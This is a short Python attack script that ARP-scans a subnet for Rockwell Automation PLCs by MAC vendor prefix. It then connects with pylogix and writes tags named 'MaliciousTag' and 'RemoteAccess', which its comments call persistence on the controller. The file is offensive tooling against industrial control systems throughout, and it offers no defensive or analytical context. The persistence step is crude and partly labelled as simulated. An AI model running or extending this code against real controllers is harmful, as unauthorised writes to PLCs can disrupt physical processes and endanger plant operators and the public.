from pylogix import PLC
from scapy.all import ARP, Ether, srp
import time

# ---------------------- FIND THE PLC'S IP ON THE NETWORK ----------------------

def find_plc_ip(network_range="192.168.1.0/24"):
    """
    Scans the network to find a Rockwell Automation PLC by checking common MAC OUI prefixes.
    """
    print("[*] Scanning network to find PLC IP address...")

    # Send ARP request to all devices in subnet
    request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network_range)
    answered_list, _ = srp(request, timeout=2, verbose=False)

    plc_ip = None
    rockwell_mac_prefixes = ["00:0E:CF", "00:1D:9C"]  # Common Rockwell MAC vendor prefixes

    for sent, received in answered_list:
        mac = received.hwsrc.upper()
        ip = received.psrc

        for prefix in rockwell_mac_prefixes:
            if mac.startswith(prefix):
                plc_ip = ip
                print(f"[+] Found PLC at IP: {plc_ip}, MAC: {mac}")
                return plc_ip

    print("[-] No PLC found on the network.")
    return None


# ---------------------- MODIFY PLC PROGRAM FOR PERSISTENCE ----------------------

def modify_plc_program(plc_ip):
    """
    Connects to the PLC and uploads a new or modified logic routine.
    """
    if not plc_ip:
        print("[-] No PLC IP provided. Exiting...")
        return

    print("[*] Connecting to PLC...")
    comm = PLC()
    comm.IPAddress = plc_ip

    try:
        # Read controller name (Sanity Check)
        response = comm.GetTagList()
        if response.Status == "Success":
            print("[+] Successfully connected to PLC.")

            # Example persistence method: Modify or create a ladder logic routine
            print("[*] Modifying PLC program for persistence.")
            
            # Modify an existing memory tag or routine to maintain access
            program_persistence_code = [
                ("MaliciousTag", 1),  # Add a persistence tag
                ("RemoteAccess", 1)   # Fake tag to simulate persistence
            ]

            for tag, value in program_persistence_code:
                res = comm.Write(tag, value)
                if res.Status == "Success":
                    print(f"[+] Successfully modified tag '{tag}' with value {value}.")
                else:
                    print(f"[-] Failed to modify tag '{tag}'. Error: {res.Status}")

        else:
            print("[-] Could not connect to PLC. Exiting.")

    except Exception as e:
        print(f"[!] Error modifying PLC: {e}")

    finally:
        comm.Close()


# ---------------------- MAIN EXECUTION ----------------------

if __name__ == "__main__":
    plc_ip = find_plc_ip()  # Discover PLC IP
    modify_plc_program(plc_ip)  # Modify PLC program if IP is found